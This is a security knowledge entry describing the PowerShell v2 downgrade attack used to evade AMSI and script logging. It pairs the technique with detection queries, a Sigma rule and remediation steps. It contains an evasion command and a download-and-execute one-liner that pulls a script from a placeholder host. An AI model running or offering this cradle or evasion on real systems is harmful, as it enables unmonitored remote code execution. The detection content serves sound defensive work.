name: PowerShell Downgrade Attack - Bypass Logging and AMSI
description: Forcing PowerShell v2 bypasses Script Block Logging, Module Logging, Transcription, and AMSI - all protections added in v3+. If .NET 2.0/3.5 is installed (common on older servers), PowerShell v2 engine is available even on modern Windows. The simplest evasion technique that still works.
source: CRTP evasion module; common red team technique
notes:
=== THE IDEA ===
PowerShell v2 has NONE of the modern security features:
- No Script Block Logging (Event 4104)
- No Module Logging
- No Transcription
- No AMSI (Antimalware Scan Interface)
- No Constrained Language Mode enforcement

=== USAGE ===
  powershell -version 2
  # Check version: $PSVersionTable.PSVersion
  # Should show Major: 2

=== DETECTION ===
  # Check if v2 engine is installed:
  Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
  # Requires .NET 2.0/3.5

=== FROM CMD ===
  powershell.exe -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')"

=== LIMITATIONS ===
- Requires .NET Framework 2.0/3.5 installed
- Process creation still logged (Event 4688 / Sysmon 1)
- The -Version 2 argument itself is detectable in command line
- Some modern cmdlets not available in v2

=== REMEDIATION ===
  # Remove PowerShell v2 engine:
  Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
  # Remove .NET 2.0/3.5 if not needed

Check if v2 engine is available

defense.why_it_works: PowerShell v2 predates all modern security controls. By explicitly requesting the v2 engine, attackers bypass AMSI, script block logging, and CLM.
defense.prerequisites: .NET Framework 2.0/3.5 and PowerShell v2 engine installed on target.
defense.impact: Complete bypass of PowerShell security logging and AMSI scanning.
defense.detection: [MITRE T1059.001] Process creation with '-version 2' or '-v 2' argument; Event 400 with EngineVersion=2; Sysmon Event 1.
defense.artifacts: Process creation logs with PowerShell v2 arguments; Event 400/403 with v2 engine version.
defense.splunk_spl:
index=sysmon EventCode=1 Image="*powershell*" CommandLine="*-version 2*" OR CommandLine="*-v 2*"
| table _time, User, CommandLine, ParentCommandLine
defense.sentinel_kql:
SecurityEvent
| where EventID == 4688
| where NewProcessName endswith "powershell.exe"
| where CommandLine contains "-version 2" or CommandLine contains "-v 2"
| project TimeGenerated, Account, CommandLine
defense.prevention: Remove PowerShell v2 engine: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root; remove .NET 2.0/3.5 if not needed.

detections.name: PowerShell Downgrade to v2
detections.logic:
title: PowerShell Downgrade Attack
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-version 2'
      - '-v 2'
  condition: selection
level: high
detections.tuning: Correlate with subsequent suspicious PowerShell activity
